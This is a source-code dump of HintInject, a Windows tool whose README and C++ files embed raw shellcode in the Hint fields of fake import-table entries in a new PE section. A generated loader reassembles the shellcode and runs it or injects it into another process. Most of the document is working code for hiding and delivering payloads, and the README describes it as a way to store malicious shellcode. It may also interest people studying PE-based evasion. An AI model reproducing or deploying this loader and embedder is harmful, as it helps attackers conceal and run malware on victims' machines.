	if (hintArray == NULL || numberOfChunks == 0) {
		std::cout << "[!] Splitting shellcode problem !" << std::endl;
		return -1;
	}
	std::cout << "[+] Number of entries required to store shellcode is " << numberOfChunks << std::endl;
	HeapFree(GetProcessHeap(),0,shellcodeContent);
	// Add a new section to our loader binary named .rrdata
	PBYTE newPeFileContent = AddNewSection(loaderContent, loaderSize, numberOfChunks, newPESize);
	if (newPeFileContent == NULL || newPESize == 0) {
		std::cout << "[!] Appending new section problem !" << std::endl;
		return -1;
	}
	std::cout << "[+] .rrdata section is added !" << std::endl;
	// By using the new section, clone the existing IAT and fake ones to this section
	if (!AddNewImportEntry(newPeFileContent, (PWORD)hintArray, numberOfChunks)) {
		std::cout << "[!] Error on adding new import entry !" << std::endl;
		return -1;
	}
	std::cout << "[+] Fake entries are appended to the original IAT !" << std::endl;
	// Write the new PE file to the disk
	if (!WriteNewPE(argv[2], newPeFileContent, newPESize)) {
		std::cout << "[!] Error on writing to " << argv[2]<< std::endl;
		return -1;
	}
	std::cout << "[+] New PE file is written to " << argv[2] << std::endl;
 	return 0;
}
```

`README.md`:

```md
# HintInject
HintInject is a shellcode embedder and loader that I developed while playing with the PE file and Import Directory Table structures. It takes a raw shellcode file and puts the shellcode in chunks into the Hint/Name Table entries which are reachable via the Import Lookup Table of a fake imported DLL entry on the loader executable. The loader then merges these chunks to execute the shellcode

# DLL Loading Process
Before explaining how HintInject works, I want to briefly mention the DLL Loading process by referencing a post in Stack Overflow.

To get the information on required DLLs and functions/imports, one should look at the `Import Directory Table` first. Import Directory Table is a table of entries, one entry for every imported DLL. These entries hold a pointer to the imported DLL name, a pointer to `Import Lookup Table`, a pointer to `Import Address Table`, and other fields for different information. 

Simply, Import Lookup Table leads to the information on imports, and Import Address Table leads to the addresses of imports. However, when the executable is on the disk, or just before the DLL loading process, Import Address Table is identical to that of the Import Lookup Table. Import Address Table's content is overwritten with the address of the imports during the DLL Loading process. 

Without going into some detail, we can take a look at the diagram below to see the relationship between these three tables.

<p align="center">
<img src="https://user-images.githubusercontent.com/26549173/164817710-18070017-a8f1-4346-8a1f-2c275152c074.png">
</p>

If we go into a little more detail, the Import Lookup Table doesn't hold the names of imports directly. For the functions that are imported by name, it holds RVAs of `Hint/Name Table` entries. These entries store the function names as Null terminated ASCII strings. Therefore, the struct definition of a Hint/Name Table entry is as follows:
```
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    CHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 
```
The Hint field here is actually an index into the export name pointer table of the DLL. It is used to accelerate finding the position of that import. Therefore, we can summarize the relationship between the Import Lookup Table and the Hint/Name table with the diagram below.

<p align="center">
<img src="https://user-images.githubusercontent.com/26549173/164833587-a9a39601-5a0f-49a4-b2ce-4b66c5b28d91.png">
</p>

To conclude, in order to find a DLL and its imports, one should follow these steps:

1. Go to Import Directory Table from the DataDirectory array of Optional Header.
2. Traverse the Import Directory Table entries for finding the desired DLL by checking its name field.
3. After finding the correct entry, go to its Import Lookup Table by using the OriginalFirstThunk field.
4. Traverse all entries in the Import Lookup Table which are pointers to Hint/Name Table entries.
5. Check import names from the Name field of Hint/Name Table entries.

# How HintInject Works?
Recently, while examining the ImportDLLInjection technique shared by x86matthew, I saw how to add a fake entry to the Import Directory of DLLs loaded in memory. Afterward, I wanted to develop a little project that adds a fake entry directly to the import table of a binary on disk, both for fun and to refresh my knowledge. While reviewing the DLL Loading process to develop this project, the Hint field in the Hint/Name Table entries used in this process caught my attention. 

According to the MSDN document, I learned that this field is used by Windows Loader to find the address of that import, which is imported by name, directly from the export name table of the DLL it is in. However, in the same document, it was stated that if the function cannot be found by using this field, that function will be searched via a binary search operation in the DLL's export name table. Based on this sentence, I thought that putting an incorrect value for this field would not disrupt the DLL Loading process.

As I mentioned above, there is an entry to the Hint/Name table corresponding to each function to be imported. In other words, we have 2 bytes to use for each import. By combining multiple imports, enough Hint fields can be obtained to store malicious shellcodes. As a result, one can use a loader binary to embed the shellcode in the Hint/Name entries of the fake import DLL entry. That loader binary can reach these entries to merge the shellcode to be executed during runtime.

HintInject can be used to create such a loader that holds the shellcode in its Hint/Name table. It firsts creates a new section named `.rrdata` and copies the current import directory into this section. After that, it appends a new fake entry whose imports will be used to hold the input shellcode. The remaining bytes of the section are used to store Import Lookup Table, Import Address Table, DLL name, and Hint/Name table of the new fake entry. As the last step, HintInject uses the Hint fields of imports to put chunks of input shellcode. Approximately, the memory layout of the new section is as follows:

<p align="center">
<img width="460" height="400" src="https://user-images.githubusercontent.com/26549173/164948439-a7e05320-a290-4a44-9dcf-3ac680b9c275.png">
</p>

# Usage

1. Build the project with the Release option.
2. Execute `HintInject.exe` with your shellcode in the raw format and an output path to create a shellcode loader: `HintInject.exe <Shellcode File> <Output Name>`
3. Run loader to execute shellcode directly, or you can give a PID to inject shellcode: `Loader.exe <PID>`
4. If you want, you change the shellcode injection method by modifying `InjectShellcode`function in the `HintInjectLoader/Main.cpp` file.

Tested on Windows 10 19044 with Visual Studio 2019:

<p align="center">
<img width="850" height="600" src="https://user-images.githubusercontent.com/26549173/167260148-da29313a-e569-4053-a960-435d3207b1b5.gif">
</p>


# Limitations

1. Regarding the fake DLL entries on the loader that executes the shellcode, both the DLL and the imported function names must actually exist. Otherwise, it gives Missing DLL error while starting the loader executable. Therefore, I used a few legitimate dlls under System32 in the project.
2. If your shellcode size is bigger and can't be created a loader for your shellcode, you can add other dlls to the `dllNames` array in the `DllNamesForFakeImports.h` file.
3. For each created loader the imported functions are selected randomly. However, if you want to change the order of dlls that are used to create fake entries, you should edit the `dllNames` array in the `DllNamesForFakeImports.h` file too. By default, HintInject will choose functions from the dlss according to the array order. In other words, the tool first selects exported functions from user32.dll, if the shellcode size is bigger than `2 * the number of user32.dll exports`, it also starts using the exports of advapi32.dll and others.
```c++
static LPCSTR dllNames[] = {"user32.dll","advapi32.dll","gdi32.dll","wininet.dll","comctl32.dll","shell32.dll","wsock32.dll","oleaut32.dll","ws2_32.dll","urlmon.dll"};

```

# References
- https://stackoverflow.com/questions/32841368/whats-the-difference-between-the-import-table-import-adress-table-and-import
- https://0xrick.github.io/win-internals/pe6/
- https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#hintname-table
- https://www.x86matthew.com/view_post?id=import_dll_injection

```

`Structs.h`:

```h
#pragma once
typedef struct{
	LPCSTR name;
	LPCSTR* nameofImports;
	PBYTE* offsetArray;
	int numberOfImports;
	PBYTE firstThunkAddr;
	PBYTE originalFirstThunkAddr;
	PBYTE nameAddr;
} FAKEIMPORT;
```

`Utils.cpp`:

```cpp
#include <Windows.h>
#include <iostream>

void DeleteDirectory(LPCSTR strPath){
	SHFILEOPSTRUCTA strOper = { 0 };
	strOper.hwnd = NULL;
	strOper.wFunc = FO_DELETE;
	strOper.pFrom = strPath;
	strOper.fFlags = FOF_SILENT | FOF_NOCONFIRMATION;

	if (SHFileOperationA(&strOper)) {
		std::cout << "[!] Unicode directory deletion problem" << std::endl;
	}
}

bool DirectoryExists(LPCSTR dirPath){
	DWORD fileType = GetFileAttributesA(dirPath);
	if (fileType == INVALID_FILE_ATTRIBUTES) {
		return false;
	}
	if (fileType & FILE_ATTRIBUTE_DIRECTORY) {
		return true;
	}
	return false;
}

void ClearDirectory() {
	char removedDir1[MAX_PATH] = { 0 };
	char removedDir2[MAX_PATH] = { 0 };
	sprintf_s(removedDir1, "%sx64\\JustLoader\\", SOLUTIONDIR);
	sprintf_s(removedDir2, "%sHintInjectLoader\\x64\\", SOLUTIONDIR);
	if (DirectoryExists(removedDir1)) {
		DeleteDirectory(removedDir1);
	}
	if (DirectoryExists(removedDir2)) {
		DeleteDirectory(removedDir2);
	}
}

char* CompileLoader() {
	ClearDirectory();
	// Find where is the VS compiler
	LPCSTR vsWhere = "\"\"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath\"";
	// Run it
	FILE* pipe = _popen(vsWhere, "rt");
	if (pipe != NULL) {
		char compilerPath[MAX_PATH] = { 0 };
		char fullCommand[2*MAX_PATH] = { 0 };
		char* loaderBinaryPath = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
		if (loaderBinaryPath == NULL) {
			std::cout << "[!] Error on Heap Allocation !" << std::endl;
			return NULL;
		}
		// Find the compiler path
		if (fgets(compilerPath, MAX_PATH, pipe) != NULL) {
			//Remove new line
			compilerPath[strlen(compilerPath) - 1] = '\0';
			sprintf_s(fullCommand, "\"\"%s\\MSBuild\\Current\\Bin\\MSBuild.exe\" %s\\HintInject.sln /t:HintInjectLoader /property:Configuration=JustLoader /property:RuntimeLibrary=MT\"\n", compilerPath, SOLUTIONDIR);
			// Compile the loader
			FILE* pipe2 = _popen(fullCommand, "rt");
			_pclose(pipe2);
			memset(fullCommand, 0x00, MAX_PATH);
			sprintf_s(fullCommand, "%sx64\\JustLoader\\HintInjectLoader.exe", SOLUTIONDIR);
			memcpy(loaderBinaryPath, fullCommand, MAX_PATH);
			// Check the binary is compiled
			if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(loaderBinaryPath) && GetLastError() == ERROR_FILE_NOT_FOUND) {
				std::cout << "[!] Compiled binary not found!" << std::endl;
				free(loaderBinaryPath);
				return NULL;
			}
			else {
				return loaderBinaryPath;
			}
		}
		else {
			std::cout << "[!] Visual Studio compiler path is not found! " << std::endl;
			return NULL;
		}
		_pclose(pipe);
		return NULL;
	}
	return NULL;
}

PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to open the file\n";
		return NULL;
	}
	fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		std::cout << ("[!] Failed to get the file size\n");
		return NULL;
	}
	PBYTE fileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
	if (!fileBuffer) {
		std::cout << ("[!] Failed to get the file size\n");
		return NULL;
	}
	DWORD dwBytesRead = 0;
	if (ReadFile(hFile, fileBuffer, fileSize, &dwBytesRead, NULL) == FALSE) {
		std::cout << ("[!] Failed to alloc a buffer!\n");
		return NULL;
	}
	if (dwBytesRead != fileSize) {
		std::cout << ("[!] Size problem!\n");
		return NULL;
	}
	CloseHandle(hFile);
	return fileBuffer;
}


bool WriteNewPE(LPCSTR fileName, PBYTE buffer, uint64_t size) {
	HANDLE hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWritten = 0;
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "[!] Terminal failure: Unable to open file for write.\n";
		return false;
	}

	if (!WriteFile(hFile, buffer, size, &dwBytesWritten, NULL)) {
		std::cout << "[!] Write failure.\n";
		return false;
	}
	CloseHandle(hFile);
	return true;
}

PBYTE SplitShellcode(PBYTE shellcodeBuffer, uint64_t sizeOfShellcode, uint64_t& numberOfChunks) {
	numberOfChunks = ceil(sizeOfShellcode / 2.0);
	PBYTE returnValue = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfChunks * sizeof(WORD));
	if (returnValue == NULL) {
		std::cout << "[!] Error on heap allocation !" << std::endl;
		return NULL;
	}
	// May not be required
	memset(returnValue, 0x00, sizeof(WORD) * numberOfChunks);
	memcpy(returnValue, shellcodeBuffer, sizeOfShellcode);
	return returnValue;
}

int GetRandomNumber(int min, int max) {
	return min + rand() % ((max + 1) - min);
}
```

`Utils.h`:

```h
#pragma once
char* CompileLoader();
PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize);
PBYTE SplitShellcode(PBYTE shellcodeBuffer, uint64_t sizeOfShellcode, uint64_t& numberOfChunks);
int GetRandomNumber(int min, int max);
bool WriteNewPE(LPCSTR fileName, PBYTE buffer, uint64_t size);
```